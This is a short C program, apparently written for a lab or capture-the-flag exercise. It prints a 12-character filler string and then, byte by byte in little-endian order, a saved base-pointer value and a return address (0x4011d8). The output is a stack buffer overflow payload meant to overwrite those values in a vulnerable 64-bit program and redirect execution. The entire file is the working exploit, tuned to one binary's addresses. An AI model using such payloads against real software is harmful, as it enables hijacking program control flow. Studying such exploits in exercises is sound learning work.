#include <stdio.h>
void main()
{
	
	int rbp7 = 0x00;
	int rbp6 = 0x00;
	int rbp5 = 0x7f;
	int rbp4 = 0xff;
	int rbp3 = 0xff;
	int rbp2 = 0xff;
	int rbp1 = 0xdb;
	int rbp0 = 0x80;
	
	
	//0x20	0xdc	0xff	0xff	0xff	0x7f	0x00	0x00
	/*
	int rbp7 = 0x00;
	int rbp6 = 0x00;
	int rbp5 = 0x7f;
	int rbp4 = 0xff;
	int rbp3 = 0xff;
	int rbp2 = 0xff;
	int rbp1 = 0xdc;
	int rbp0 = 0x20;
	*/
	
	int adret7 = 0x00;
	int adret6 = 0x00;
	int adret5 = 0x00;
	int adret4 = 0x00;
	int adret3 = 0x00;
	int adret2 = 0x40;
	int adret1 = 0x11;
	int adret0 = 0xd8;
	
	
	printf("123456789012%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n", rbp0, rbp1, rbp2, rbp3, rbp4, rbp5, rbp6, rbp7, adret0, adret1, adret2, adret3, adret4, adret5, adret6, adret7);
	
}